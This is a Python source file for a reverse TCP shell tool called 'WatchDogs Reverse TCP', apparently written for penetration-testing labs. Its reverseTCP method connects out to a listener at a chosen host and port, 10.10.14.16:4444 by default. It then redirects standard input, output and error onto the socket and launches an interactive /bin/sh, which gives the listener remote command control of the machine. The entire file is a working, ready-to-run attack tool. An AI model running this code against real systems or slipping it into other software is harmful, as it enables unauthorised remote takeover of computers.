#!/usr/bin/python

# author: WatchDogOblivion
# description: TODO
# WatchDogs Reverse TCP a.k.a wrtcp

import os;
import socket;
import argparse;
import subprocess;
import traceback;

class WReverseTCP():

    VERSION = "1.0";

    def __init__(self, lhost="10.10.14.16", lport=4444, shell="/bin/sh"):
        self.lhost = lhost;
        self.lport = lport;
        self.shell = shell;
        self.parser = None;
        self.args = None;
    
    @staticmethod
    def toCamel(string,char="_"):
        camel = "";
        strings = string.split(char);
        length = len(strings);
        for i in range(length):
            s = strings[i];
            if(i == 0):
                camel += s.lower();
            else:
                camel += s[0].upper() + s[1:].lower();
        return camel;

    def parseArgs(self):
        self.parser = argparse.ArgumentParser(add_help=False);
        parser = self.parser;
        parser.add_argument("-lh", "--lhost", help="Specify your local ip address. Default is: {}".format(self.lhost), type=str, metavar="", default=self.lhost);
        parser.add_argument("-lp", "--lport", help="Specify your local port. Default is: {}".format(self.lport), type=int, metavar="", default=self.lport);
        parser.add_argument("-s", "--shell", help="Specify the shell to launch on successful reverse tcp. Default is: {}".format(self.shell), type=str, metavar="", default=self.shell);
        parser.add_argument("-v", "--version", action="version", help="Show version", version="Reverse TCP version: {}".format(WReverseTCP.VERSION));
        parser.add_argument("-h", "--help", action="help", help="Show this help message");
        self.args = parser.parse_args();

    def setArguments(self):
        args = self.args;
        vargs = vars(args);
        for varg in vargs:
            setattr(self, WReverseTCP.toCamel(varg), vargs[varg]);

    def reverseTCP(self):
        print("Initiating connection: {}:{} {}".format(self.lhost, self.lport, self.shell))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
        s.connect((self.lhost, self.lport));
        os.dup2(s.fileno(), 0);
        os.dup2(s.fileno(), 1);
        os.dup2(s.fileno(), 2);
        p = subprocess.call([self.shell, "-i"]);

def __main__():
    wrtcp = WReverseTCP();
    try:
        wrtcp.parseArgs();
        wrtcp.setArguments();
        wrtcp.reverseTCP();
    except ValueError as ve:
        print(ve);
        print(wrtcp.parser.print_usage());
    except Exception as e:
        print(traceback.format_exc());
        print(wrtcp.parser.print_usage());

__main__();